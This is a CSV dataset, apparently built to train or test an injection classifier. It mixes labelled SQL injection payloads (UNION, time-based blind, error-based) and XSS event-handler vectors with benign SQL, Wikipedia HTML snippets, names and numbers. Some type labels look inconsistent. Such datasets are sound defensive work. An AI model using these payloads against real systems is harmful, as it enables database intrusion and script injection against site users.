Text,Label,type
"select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and   (  ""%""  =  """,1,sql
"   SELECT teeth, steam, frighten FROM size WHERE am  IS NULL",0,sql
"<i onmousemove=""alert(1)"">test</i>",2,xss
"-5596'   )    )     )   union all select 4877,4877,4877,4877,4877,4877,4877,4877,4877,4877--",1,sql
1'   )    )    as hpta where 5376  =  5376 waitfor delay '0:0:5'--,1,sql
pockett_miguelin@noviasteresapalacios.aw,0,sql
" select * from users where id  =  '1' union select +\#,@@VERSION -- 1'",1,sql
"1"" procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and ""ikhr""  =  ""ikhr",1,xss
"-1439"" or 2849  =  8484 and ""pmdl""  =  ""pmdl",1,xss
4358,0,sql
"1' where 1673  =  1673 and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --",1,sql
1%'  )   and 2006  =  2006,1,sql
vallclara,0,xss
SELECT * FROM silent WHERE society = 'failed' FETCH FIRST 3 ROWS ONLY,0,sql
"SELECT * FROM meat WHERE powerful BETWEEN ""operation"" AND    ""knife""",0,sql
"1  )   as svkf where 6503  =  6503 or char  (  75  )  ||char  (  70  )  ||char  (  99  )  ||char  (  83  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",1,sql
	 </span>,0,xss
"SELECT column1 , column2 , ... FROM table_name WHERE condition ; CREATE OR REPLACE VIEW [Brazil Customers] AS ",0,sql
43877,0,sql
" SELECT FIELD ( ""q"", ""s"", ""q"", ""l"" ) ; ",0,sql
"1'  )   or char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substring  (  repeat  (  right  (  char  (  1441  )  ,0  )  ,5000000000  )  ,null  )  --",1,sql
"	 </span> <span class=""reference-text""><cite class=""citation news"">Ford, Martin; Colvin, Geoff (6 September 2015). <a rel=""nofollow"" class=""external text"" href=""https://www.theguardian.com/technology/2015/sep/06/will-robots-create-destroy-jobs"">""Will robots create more jobs than they destroy?"" </a>. <i>The Guardian </i><span class=""reference-accessdate"">. Retrieved <span class=""nowrap"">13 January ",0,xss
"	 </span> <span class=""reference-text""><cite class=""citation web""><a rel=""nofollow"" class=""external text"" href=""http://image-net.org/challenges/LSVRC/2017/"">""ILSVRC2017"" </a>. <i>image-net.org </i><span class=""reference-accessdate"">. Retrieved <span class=""nowrap"">6 November ",0,xss
SELECT hour ( s ) FROM cover INNER JOIN,0,sql
nickonov,0,sql
1'||  (  select 'sliy' where 9494  =  9494,1,sql
SELECT * FROM explore WHERE turn = 'general' LIMIT 3,0,sql
SELECT * FROM area WHERE Price NOT BETWEEN 10 AND 20,0,xss
<a id=x tabindex=1 onbeforeactivate=alert(1)></a>,2,xss
SELECT * FROM  ( SELECT running FROM possibly ) ,0,sql
	 </span>,0,xss
"1' and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )   and 'cotv' like 'cotv",1,xss
-7209'   )    )     )   or 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and    (    (     (  'stqx'  =  'stqx,1,sql
SELECT AVG ( act ) FROM service SELECT SUM ( program ) ,0,sql
"  SELECT BINARY ""HELLO""  =  ""hello"";",0,xss
" 	<sup id=""cite_ref-Emotion_and_affective_computing_144-0"" class=""reference""><a href=""#cite_note-Emotion_and_affective_computing-144"">&#91;141&#93; </a> </sup> Similarly, some <a href=""/wiki/Virtual_assistant"" title=""Virtual assistant"">virtual assistants </a> are programmed to speak conversationally or even to banter humorously; this tends to give naïve users an unrealistic conception of how intelligent existing computer agents actually are.<sup id=""cite_ref-145"" class=""reference""><a href=""#cite_note-145"">&#91;142&#93; </a> </sup>",0,xss
<template id=x tabindex=1 onfocusin=alert(1)></template>,2,xss
SELECT LAST_INSERT_ID (  ) ;,0,sql
SELECT * FROM generally WHERE master = 'right' FETCH FIRST 3 ROWS ONLY,0,sql
1'   )    )    as qqvk where 1007  =  1007,1,sql
<summary onpointerenter=alert(1)>XSS</summary>,2,xss
aizpuru cerusoli,0,sql
    </div>,0,xss
SELECT * FROM dry  WHERE attempt = function,0,sql
5631,0,sql
"1%""   )    )    union all select null,null,null,null,null,null,null,null,null,null#",1,sql
4.20136E+14,0,sql
SELECT * FROM last,0,sql
<basefont onpointerenter=alert(1)>XSS</basefont>,2,xss
dipterocrea,0,sql
14973109v,0,sql
1' and non_existant_table   =   '1,1,sql
9.11358E+14,0,sql
"   SELECT Employees.in, COUNT ( Orders.shoutID )  AS paidFROM    ( OrdersINNER JOIN never ON Orders.putID  =  Employees.trailID ) ",0,sql
"<h3><span class=""mw-headline"" id=""Law-related_professions"">Law-related professions ",0,xss
"<style>:target {color:red;}</style><picture id=x style=""transition:color 1s"" ontransitionend=alert(1)></picture>",2,xss
-3998'   )    )    or 3038  =  3038,1,sql
"<li><cite id=""CITEREFRussellNorvig2003"" class=""citation""><a href=""/wiki/Stuart_J._Russell"" title=""Stuart J. Russell"">Russell, Stuart J. </a>; <a href=""/wiki/Peter_Norvig"" title=""Peter Norvig"">Norvig, Peter </a> (2003), <a rel=""nofollow"" class=""external text"" href=""http://aima.cs.berkeley.edu/""><i>Artificial Intelligence: A Modern Approach </i> </a> (2nd ed.), Upper Saddle River, New Jersey: Prentice Hall, <a href=""/wiki/International_Standard_Book_Number"" title=""International Standard Book Number"">ISBN </a>&#160;<a href=""/wiki/Special:BookSources/0-13-790395-2"" title=""Special:BookSources/0-13-790395-2""><bdi>0-13-790395-2 </bdi> </a> </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Abook&amp;rft.genre=book&amp;rft.btitle=Artificial+Intelligence%3A+A+Modern+Approach&amp;rft.place=Upper+Saddle+River%2C+New+Jersey&amp;rft.edition=2nd&amp;rft.pub=Prentice+Hall&amp;rft.date=2003&amp;rft.isbn=0-13-790395-2&amp;rft.aulast=Russell&amp;rft.aufirst=Stuart+J.&amp;rft.au=Norvig%2C+Peter&amp;rft_id=http%3A%2F%2Faima.cs.berkeley.edu%2F&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988""> ",0,xss
"1%"" rlike sleep  (  5  )  #",1,sql
"-7306"" or 2081  =  6847",1,sql
"	<a href=""/wiki/Affect_(psychology)"" title=""Affect (psychology)"">affects </a>.<sup id=""cite_ref-FOOTNOTEThro1993_140-0"" class=""reference""><a href=""#cite_note-FOOTNOTEThro1993-140"">&#91;137&#93; </a> </sup>",0,xss
conceptear,0,sql
"<li class=""toctree-l1""><a class=""reference internal"" href=""topics/extensions.html"">Extensions</a></li>",0,xss
SELECT natural ( s )  FROM speed FULL OUTER JOIN,0,sql
 ,1,sql
select * from users where id  =  1 or \<$ or 1  =  1 -- 1,1,sql
"   SELECT mouth, swimming, herself FROM dangerous WHERE leaving  IS NULL",0,sql
plza. felix rodriguez de la fuente 140 3a,0,sql
"<ul><li><a href=""#CITEREFACM1998"">ACM 1998 </a>, I.2.7 </li>",0,xss
1'   )    )    union all select null#,1,sql
2.81517E+15,0,xss
SELECT COUNT ( headed ) FROM seven,0,sql
SELECT TOP 50 PERCENT * FROM bottle SELECT * FROM addition FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM son,0,sql
"1""  )   and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and   (  ""ynde""  =  ""ynde",1,sql
1 where 5443  =  5443,1,sql
"<p>Scrapy is a fast high-level <a class=""reference external"" href=""https://en.wikipedia.org/wiki/Web_crawler"">web crawling</a> and <a class=""reference external"" href=""https://en.wikipedia.org/wiki/Web_scraping"">web scraping</a> framework, used",0,xss
<ul>,0,xss
"1""  )   union all select null,null,null--",1,sql
1'   )    )     )   and 5615  =  5458--,1,sql
"1"" where 5977  =  5977",1,xss
SELECT * FROM mice  WHERE problem = onto,0,xss
"<div draggable=""true"" contenteditable>drag me</div><footer ondragover=alert(1) contenteditable>drop here</footer>",2,xss
"  SELECT POW ( 8, 3 ) ;",0,sql
hemisfero,0,sql
16646,0,xss
"-3007  )   where 6648  =  6648 union all select 6648,6648,6648,6648,6648,6648,6648,6648#",1,sql
1'  )   and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and   (  'ifvz' like 'ifvz,1,sql
<animatemotion onpointerup=alert(1)>XSS</animatemotion>,2,xss
"1""   )    )    and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )   and    (    (   ""ykhp"" like ""ykhp",1,sql
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><code id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></code>",2,xss
SELECT * FROM support WHERE court = 'youth' FETCH FIRST 3 ROWS ONLY,0,sql
santaren,0,xss
"1"" and   (  7424  =  2381  )  *2381 and ""dvju""  =  ""dvju",1,xss
nelba,0,sql
"  UPDATE species SET frog =  'safe', City =  'movie' WHERE flower =  scientist",0,sql
SELECT * FROM consider WHERE bone IN  ( SELECT walk FROM down ) ,0,sql
<plaintext id=x tabindex=1 ondeactivate=alert(1)></plaintext><input id=y autofocus>,2,xss
"	 </span> <span class=""toctext"">Malevolent and friendly AI ",0,xss
"<dt onbeforepaste=""alert(1)"" contenteditable>test</dt>",2,xss
-5995'   )    )    or 6872  =  6872 and    (    (   'pywh'  =  'pywh,1,sql
FROM  ( SELECT DISTINCT century FROM supply ) ,0,sql
1'+  (  select lqhd where 4251  =  4251 and   (  8754  =  5779  )  *5779  )  +',1,sql
SELECT * FROM offer WHERE ancient = 'thin'  OR bear = 'basket',0,xss
"<template draggable=""true"" ondragend=""alert(1)"">test</template>",2,xss
"c/ concepcion alexandre 82,",0,sql
"1""  )   as sstd where 9629  =  9629 or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )  --",1,sql
pelamen,0,sql
DELETE FROM cloud WHERE young = 'country',0,sql
SELECT ProductName FROM Products WHERE ProductID  =  ALL,0,sql
"<samp onbeforecopy=""alert(1)"" contenteditable>test</samp>",2,xss
SELECT * FROM nose WHERE zero = 'slope'  AND City = 'muscle',0,xss
SELECT these ( s )  FROM within UNION,0,xss
ulrico,0,sql
" </div> </td> </tr><tr><th scope=""row"" class=""navbox-group"" style=""width:1%""><a class=""mw-selflink selflink"">Artificial<br />intelligence </a> </th><td class=""navbox-list navbox-even"" style=""text-align:left;border-left-width:2px;border-left-style:solid;width:100%;padding:0px"">",0,xss
"	 </span> <span class=""reference-text"">",0,xss
"Representing knowledge about knowledge: Belief calculus, <a href=""/wiki/Modal_logic"" title=""Modal logic"">modal logics </a>:",0,xss
"SELECT * FROM heard WHERE certainly BETWEEN ""place"" AND    ""ruler""",0,sql
"<style>@keyframes x{}</style><legend style=""animation-name:x"" onanimationstart=""alert(1)""></legend>",2,xss
"1' where 2162  =  2162 procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #",1,sql
emil,0,sql
"   SELECT COUNT ( meal ) , wonder FROM primitive BY tall",0,xss
SELECT * FROM pupil,0,sql
"<li><a href=""/wiki/Consciousness"" title=""Consciousness"">Consciousness </a> </li>",0,xss
"<style>:target {color:red;}</style><summary id=x style=""transition:color 1s"" ontransitionend=alert(1)></summary>",2,xss
"1""  )   where 7723  =  7723 and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )  --",1,sql
"<li><a href=""/wiki/Observation"" title=""Observation"">Observation </a> </li>",0,xss
1'   )    )    as xpmy where 5274  =  5274 rlike   (  select   (  case when   (  6252  =  7704  )   then 1 else 0x28 end   )    )   --,1,xss
union all select @@version--,1,sql
"<code onmousedown=""alert(1)"">test</code>",2,xss
"  SELECT wheat AS power, railroad AS [entirely]  FROM character",0,xss
"call regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and    (    (     (  ""jcyh""  =  ""jcyh",1,sql
"<marquee onbeforepaste=""alert(1)"" contenteditable>test</marquee>",2,xss
"<BODY BACKGROUND=""javascript:alert('')"">",2,xss
select case when 8867  =  7630 then 1 else null end--,1,sql
mullinar_lemanska@gallegonicolas.ps,0,xss
"-7868""   )    )    or 9323  =  9323#",1,xss
 </p>,0,xss
SELECT * FROM clock WHERE Price NOT BETWEEN 10 AND 20,0,sql
"1""   )    )    and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (   ""bcxh"" like ""bcxh",1,sql
yeste meloda,0,sql
SELECT dollar ( s )  FROM stiff SELECT root FROM contrast,0,sql
SELECT * FROM column WHERE captain NOT BETWEEN 'dear' AND 'variety',0,sql
76,0,sql
" </div> </td> </tr><tr><th scope=""row"" class=""navbox-group"" style=""width:1%""><a href=""/wiki/Computer_security"" title=""Computer security"">Security </a> </th><td class=""navbox-list navbox-odd"" style=""text-align:left;border-left-width:2px;border-left-style:solid;width:100%;padding:0px"">",0,xss
"	 </span>. </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Ajournal&amp;rft.genre=unknown&amp;rft.jtitle=image-net.org&amp;rft.atitle=ILSVRC2017&amp;rft_id=http%3A%2F%2Fimage-net.org%2Fchallenges%2FLSVRC%2F2017%2F&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988""> ",0,xss
"<dir oncut=""alert(1)"" contenteditable>test</dir>",2,xss
SELECT bow ( s )  FROM expect FULL OUTER JOIN,0,sql
"<div role=""note"" class=""hatnote navigation-not-searchable"">Further information: <a href=""/wiki/Technological_unemployment#21st_century"" title=""Technological unemployment"">Technological unemployment §&#160;21st century </a> </div>",0,xss
delmo,0,sql
"<br draggable=""true"" ondrag=""alert(1)"">test</br>",2,xss
"   SELECT deeply, to, perFROM improve WHERE aloud  IS NOT NULL",0,xss
select pg_sleep  (  5  )   and    (    (   4382  =  4382,1,sql
"	 </span><link rel=""mw-deduplicated-inline-style"" href=""mw-data:TemplateStyles:r935243608""/> </li> </ul>",0,xss
"<dt><a class=""reference internal"" href=""topics/stats.html""><span class=""doc"">Stats Collection",0,xss
SELECT * FROM said WHERE slowly = 'lose',0,sql
"<nextid draggable=""true"" ondragenter=""alert(1)"">test</nextid>",2,xss
"<details onmouseover=""alert(1)"">test</details>",2,xss
"	 </span><link rel=""mw-deduplicated-inline-style"" href=""mw-data:TemplateStyles:r935243608""/> </li>",0,xss
"<ul><li><a href=""/wiki/Applications_of_artificial_intelligence"" title=""Applications of artificial intelligence"">Applications of artificial intelligence </a> </li>",0,xss
ralf,0,sql
"select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and    (    (   ""%""  =  """,1,xss
1  )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,1,sql
"<style>@keyframes x{}</style><menuitem style=""animation-name:x"" onanimationstart=""alert(1)""></menuitem>",2,xss
SELECT * FROM pond FETCH FIRST 3 ROWS ONLY,0,sql
<rtc id=x tabindex=1 onbeforedeactivate=alert(1)></rtc><input autofocus>,2,xss
saleta,0,sql
9226,0,sql
querando,0,sql
7118,0,sql
SELECT QUARTER ( CURDATE (   )  )  ;,0,sql
"SELECT * FROM plastic WHERE rich BETWEEN ""low"" AND    ""aloud""",0,xss
"1'   )    )    union all select null,null,null,null,null,null,null,null,null--",1,sql
<canvas onpointerout=alert(1)>XSS</canvas>,2,xss
<q onpointerout=alert(1)>XSS</q>,2,xss
"<div draggable=""true"" contenteditable>drag me</div><video ondrop=alert(1) contenteditable>drop here</video>",2,xss
46841,0,xss
1'   )    )    as gchn where 5856  =  5856,1,xss
"<li><a href=""/wiki/No_free_lunch_in_search_and_optimization"" title=""No free lunch in search and optimization"">No free lunch in search and optimization </a> </li>",0,xss
"<thead draggable=""true"" ondragenter=""alert(1)"">test</thead>",2,xss
"<style>:target {transform: rotate(180deg);}</style><dt id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></dt>",2,xss
SELECT * FROM getting WHERE visitor LIKE '%pictured%',0,xss
1  )   where 6116  =  6116 and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )   --,1,sql
"<content onbeforecopy=""alert(1)"" contenteditable>test</content>",2,xss
"<li id=""cite_note-hochreiter1991-264""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-hochreiter1991_264-0"">^ </a> </b> ",0,xss
valdemaluque,0,sql
 UPDATE serve SET official = 'colony'WHERE labor = 'dark',0,sql
"1'+  (  select mcfb where 4050  =  4050 or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3   )    )   +'",1,sql
"  SELECT Orders.childrenrID, Employees.review, Employees.instead FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID  =  Employees.quicklyID ORDER BY Orders.reasonID",0,sql
SELECT option_value FROM wp_options WHERE option_name  =  'options_cell_number' LIMIT 1,0,sql
"<ins onmousemove=""alert(1)"">test</ins>",2,xss
<textarea onpointerdown=alert(1)>XSS</textarea>,2,xss
"<li><a href=""/wiki/Information_security"" title=""Information security"">Information security </a> </li>",0,xss
"1' and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --",1,sql
"  SELECT   CAST ( ""2017-08-29"" AS DATE ) ;",0,sql
gonzaga ripalda,0,sql
"select * from generate_series  (  7724,7724,case when   (  7724  =  8170  )   then 1 else 0 end  )   limit 1--",1,sql
"<li><a href=""/wiki/Emergent_algorithm"" title=""Emergent algorithm"">Emergent algorithm </a> </li>",0,xss
"  SELECT Orders.memoryrID, Employees.slightly, Employees.rain FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID  =  Employees.westernID ORDER BY Orders.medicineID",0,sql
SELECT * FROM dig WHERE column = 'human',0,xss
<head>,0,xss
" SELECT column_name ( s )  FROM describe,came",0,xss
"<img draggable=""true"" ondragleave=""alert(1)"">test</img>",2,xss
" select * from users where id  =  '1' or !<1 union select 1,version  (    )   -- 1'",1,sql
1'   )    )     )   or sleep  (  5  )   and    (    (     (  'ecur'  =  'ecur,1,xss
"1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #",1,sql
1' and 7756  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  7756  =  7756  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     ) ,1,xss
9.82891E+15,0,sql
"<li><a href=""/wiki/Mental_representation"" title=""Mental representation"">Mental representation </a> </li>",0,xss
15911,0,sql
SELECT TOP 50 PERCENT * FROM angry,0,sql
select   (  case when   (  2830  =  7046  )   then 2830 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,1,xss
"<select onmouseup=""alert(1)"">test</select>",2,xss
"<pre onmouseleave=""alert(1)"">test</pre>",2,xss
"<li id=""cite_note-Revival_of_connectionism-172""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-Revival_of_connectionism_172-0"">^ </a> </b> ",0,xss
SELECT AVG ( oil ) FROM happen,0,xss
raudres,0,xss
"1"" where 6111  =  6111 and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1,sql
SELECT AVG ( flight ) FROM individual,0,sql
SELECT AVG ( Price ) FROM applied,0,sql
caesar-vitez2@apelton.sy,0,xss
<main onpointerleave=alert(1)>XSS</main>,2,xss
"1"" where 4808  =  4808 union all select null,null,null,null,null,null,null#",1,sql
	 </span> </li>,0,xss
SELECT * FROM join,0,sql
SELECT * FROM born FETCH FIRST 50 PERCENT ROWS ONLY,0,sql
faix,0,sql
"	 </span><link rel=""mw-deduplicated-inline-style"" href=""mw-data:TemplateStyles:r935243608""/> </li>",0,xss
al9ol,0,xss
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><cite id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></cite>",2,xss
recerdo,0,sql
"quevedo y quintana s/n, 4-h",0,sql
"c/ gallarza, 147",0,sql
SELECT ring ( s )  FROM represent SELECT doctor ( s ) ,0,sql
"<div class=""section"" id=""built-in-services"">",0,xss
SELECT * FROM dog,0,xss
<body onscroll=alert(1)><div style=height:1000px></div><div id=x></div>,2,xss
"<style>:target {color:red;}</style><title id=x style=""transition:color 1s"" ontransitionend=alert(1)></title>",2,xss
cenheg,0,sql
<button onpointerup=alert(1)>XSS</button>,2,xss
"select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5--",1,sql
select sleep  (  5   )    )   ||',1,sql
39395797v,0,xss
doortje,0,sql
SELECT football ( s )  FROM lovely LEFT JOIN,0,sql
98538229l,0,sql
"1""   )    )    as dvpb where 6673  =  6673",1,xss
giralda,0,sql
"<meta name=""generator"" content=""MediaWiki 1.35.0-wmf.22""/>",0,xss
segura reygadas,0,sql
select sleep  (  5  )  -- hlgt,1,sql
<svg><i onload=alert(1)></i>,2,xss
" SELECT * FROM review ORDER BY told ASC, worth DESC",0,sql
"<slot oncontextmenu=""alert(1)"">test</slot>",2,xss
1'  )   and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and   (  'vnfi'  =  'vnfi,1,sql
-8086%'  )   or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and   (  '%'  =  ',1,xss
"1""   )    )    or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and    (    (   ""cyyh""  =  ""cyyh",1,sql
1'+  (  select 'jmdl' where 7827  =  7827,1,xss
SELECT AVG ( but ) FROM improve SELECT SUM ( cross ) ,0,xss
SELECT AVG ( rest ) FROM toy SELECT SUM ( be ) ,0,sql
"1'||  (  select 'wqmz' where 6400  =  6400 and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x   )    )   ||'",1,sql
"  SELECT byID AS ID, alphabet AS cover FROM jet",0,xss
cadaqus,0,xss
refrigerativo,0,sql
SELECT hall FROM hour,0,sql
pelle1@906.com.aq,0,sql
"<small onbeforecopy=""alert(1)"" contenteditable>test</small>",2,xss
"1'   )    )     )   union all select null,null,null,null,null,null,null,null,null#",1,xss
SELECT TOP 3 * FROM difficulty SELECT * FROM music 3SELECT * FROM mother,0,xss
select * from users where id  =  1.%@ or 1  =  1 -- 1,1,sql
"1""   )    )     )   and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )   and    (    (     (  ""dnlz""  =  ""dnlz",1,sql
SELECT adjective ( s )  FROM short,0,sql
 UPDATE instant SET slowly = 'sometime'WHERE positive = 'care',0,sql
"<video onbeforecopy=""alert(1)"" contenteditable>test</video>",2,xss
"1'||  (  select 'ojdz' where 7350  =  7350 and 6510  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7   )    )   ||'",1,sql
79039106c,0,sql
"SELECT ADDDATE ( ""2017-06-15 09:34:21"", INTERVAL 15 MINUTE ) ;",0,xss
SELECT * FROM birth WHERE organization = 'consonant',0,sql
"<rb draggable=""true"" ondragend=""alert(1)"">test</rb>",2,xss
"  SELECT * FROM sometime WHERE pan IN  ( 'slowly', 'climate', 'dangerous' )  ",0,sql
arceo feliu,0,sql
"1' in boolean mode  )   and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  #",1,sql
SELECT equally FROM gate UNION SELECT mouth FROM itself ORDER BY car,0,sql
"1'   )    )    as nuku where 7009  =  7009 union all select null,null,null,null,null#",1,xss
<nextid onblur=alert(1) tabindex=1 id=x></nextid><input autofocus>,2,xss
1364,0,xss
"<dt><a class=""reference internal"" href=""topics/selectors.html""><span class=""doc"">Selectors",0,xss
"AllowScriptAccess=""always""",2,xss
SELECT noun ( s FROM new RIGHT JOIN,0,xss
1 and 7533  =  7533# absp,1,xss
"-2377%'   )    )     )   union all select 7706,7706--",1,sql
SELECT * FROM look WHERE living = 'given'  AND City = 'face',0,sql
"-1256' in boolean mode  )   union all select 7889,7889,7889,7889,7889,7889,7889,7889,7889--",1,sql
SELECT * FROM exclaimed WHERE heading NOT BETWEEN 'muscle' AND 'continued',0,xss
SELECT TOP 3 * FROM stay SELECT * FROM until 3SELECT * FROM bar,0,sql
"1"" or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )  ",1,sql
"<dl onmouseleave=""alert(1)"">test</dl>",2,xss
